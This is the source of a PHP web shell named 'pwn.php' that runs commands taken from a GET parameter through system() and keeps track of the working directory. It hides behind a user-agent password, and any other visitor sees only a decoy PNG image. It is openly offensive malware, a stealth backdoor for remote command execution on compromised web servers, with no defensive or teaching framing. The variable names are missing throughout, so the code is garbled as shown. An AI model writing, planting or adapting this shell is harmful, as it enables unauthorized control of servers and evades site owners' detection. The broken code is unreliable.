<?PHP
/*
Name:   pwn.php
Desc:   PHP shell for pwning
Rev:    0.1
Date:   06/08/10
Features:
        Stealth feature password protected via user agent with image output.
        Tracks pwd between commands.
*/
 = 0; //1 - Open access, 0 - Password protected via user agent.
="secret"; //If open=0 user agent must =
="iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAIAAAAlC+aJAAAAAXNSR0IArs4c6QAAAAlwSFlzAAAL
EwAACxMBAJqcGAAAAAd0SU1FB9oIAgEPAo1cAXcAAAAZdEVYdENvbW1lbnQAQ3JlYXRlZCB3aXRo
IEdJTVBXgQ4XAAAAIklEQVRo3u3BAQ0AAADCoPdPbQ8HFAAAAAAAAAAAAAAA8G4wQAABEp2S+AAA
AABJRU5ErkJggg==";
=['cmd'];
=['pwd'];

if(=='') ='ls';

if(['HTTP_USER_AGENT'] ==  || ){
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Wolf's shell</title>
<style>
body{
        background-color: #000000;
        color: #FFFFFF;
}
#main{
        width: 700px;
        margin: auto;
}
#output{
        height: 500px;
        overflow: auto;
        background-color: #111111;
        -moz-border-radius: 10px;
        -webkit-border-radius: 10px;
        padding: 10px;
}
#banner{
        -moz-border-radius: 10px;
        -webkit-border-radius: 10px;
        padding: 5px;
        text-align: center;
        background-color: #0D0D0D;
        color: #00AA00;
        font-weight: bolder;
        font-size: 5em;
        font-family: "Courier New";
}
</style>
</head>
<body>
<div id="main">
<div id="banner">
pwn shell
</div>
<br/>
<div id='output'><font color="green">
<?PHP
system("whoami");
echo "@pwn</font><font color=white>:</font><font color=blue></font>#<pre>";
=system("cd ;;pwd");
?>
</pre>
</div>

<form action="" method="get">
<input type="text" name="cmd" size="74"/>
<input type="hidden" name="pwd" value="<?PHP echo ;?>"/>
<input type="submit" value="Execute"/>
</form>
</div>
</body>
</html>
<?PHP
}else{
header("Content-type: image/png");
echo base64_decode();
}
?>
